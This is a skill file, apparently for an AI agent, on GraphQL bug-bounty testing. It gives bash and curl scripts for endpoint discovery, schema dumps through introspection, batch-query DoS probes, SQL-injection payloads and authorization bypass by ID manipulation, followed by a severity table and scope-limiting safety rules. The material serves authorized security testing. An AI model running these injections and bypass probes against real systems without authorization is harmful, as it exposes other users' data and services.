---
name: bug-bounty-graphql
description: Use for GraphQL vulnerability testing: introspection abuse, query complexity attacks, batch query DoS, injection, authorization bypass, and schema enumeration.
---

# Bug Bounty GraphQL Testing

Use this skill when GraphQL endpoints are discovered (`/graphql`, `/graph`, `/api/graphql`, etc.).

## GraphQL Discovery

```bash
target="example.com"
slug="$(printf '%s' "$target" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9._-]/_/g')"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"

# Common GraphQL paths
paths=("/graphql" "/graph" "/api/graphql" "/v1/graphql" "/v2/graphql" "/gql" "/console")

for path in "${paths[@]}"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$target$path")
    [ "$code" != "404" ] && echo "$path -> $code" >> "$BB_ROOT/active/graphql-paths.txt"
done
```

## Introspection Testing

**P0 Alert:** If introspection is enabled, dump the entire schema:

```bash
# Check introspection
query='{"query":"{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}"}'
curl -sk -X POST "https://$target/graphql" \
    -H "Content-Type: application/json" \
    -d "$query" | jq '.data.__schema.types' > "$BB_ROOT/vulns/graphql-introspection.json"

# If successful, this is a CRITICAL finding - full schema exposure
if [ -s "$BB_ROOT/vulns/graphql-introspection.json" ]; then
    echo "[!] CRITICAL: GraphQL introspection enabled - full schema dump"
    # Dump complete schema
    curl -sk -X POST "https://$target/graphql" \
        -H "Content-Type: application/json" \
        -d '{"query":"{__schema{queryType{name},mutationType{name},subscriptionType{name},types{...FullType},directives{name,description,locations,args{...InputValue}}}}","variables":{},"operationName":"IntrospectionQuery"}' | \
        jq '.' > "$BB_ROOT/vulns/graphql-full-schema.json"
fi
```

## Query Complexity Attack

```bash
# Test for batch query DoS
for i in {1..100}; do
    queries+="{test$i: __typename}"
done
curl -sk -X POST "https://$target/graphql" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{$queries}\"}"
# If server processes 100 queries in one request, potential DoS vector
```

## GraphQL Injection

```bash
# Test for injection in arguments
payloads=(
    '{"query":"{user(id:\"test\\\" OR \\\"1\\\"=\\\"1") {name}}"}'
    '{"query":"{search(query:\"\\\" OR 1=1 --\") {results}}"}'
    '{"query":"{__typename}"}'
    '{"query":"{__schema{types{name}}}"}'
)

for payload in "${payloads[@]}"; do
    curl -sk -X POST "https://$target/graphql" \
        -H "Content-Type: application/json" \
        -d "$payload" | tee -a "$BB_ROOT/vulns/graphql-injection-test.txt"
done
```

## Authorization Bypass

```bash
# Test accessing other users' data via ID manipulation
queries=(
    '{"query":"{user(id:\"1\") {email name role}}"}'
    '{"query":"{user(id:\"2\") {email name role}}"}'
    '{"query":"{users {id email role}}"}'
)

for query in "${queries[@]}"; do
    curl -sk -X POST "https://$target/graphql" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer YOUR_TEST_TOKEN" \
        -d "$query" >> "$BB_ROOT/vulns/graphql-auth-test.txt"
done
```

## GraphQL Tools

- `inql` - GraphQL scanner (Burp extension)
- `graphw00f` - GraphQL fingerprinting
- `gqlmap` - GraphQL schema mapper
- `batery` - GraphQL testing framework
- Manual: Burp Suite, curl, jq

## Reporting GraphQL Findings

| Severity | Finding |
|----------|---------|
| **Critical** | Introspection enabled on production, exposes full schema |
| **High** | Authorization bypass allowing access to other users' data |
| **High** | GraphQL injection leading to SQLi/command injection |
| **Medium** | No query complexity limits (DoS potential) |
| **Medium** | Verbose error messages leaking internal structure |
| **Low** | Missing rate limiting on GraphQL endpoint |

## Safety Rules

- Only test within authorized scope boundaries.
- Use self-owned test accounts exclusively. Never test on real user accounts.
- No destructive operations: no data deletion, no DoS, no real data exfiltration.
- Require explicit approval before active scanning, brute-force, or high-volume requests.
- All findings must be manually validated before reporting.

## Output Convention

All commands must save output to organized paths:

```bash
ts="$(date +%Y%m%d-%H%M%S)"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"
# stdout -> $BB_ROOT/<phase>/<tool>-$ts.txt
# stderr -> $BB_ROOT/logs/<tool>-$ts.err
```

Never dump raw tool output into chat context. Save to files, then read targeted excerpts.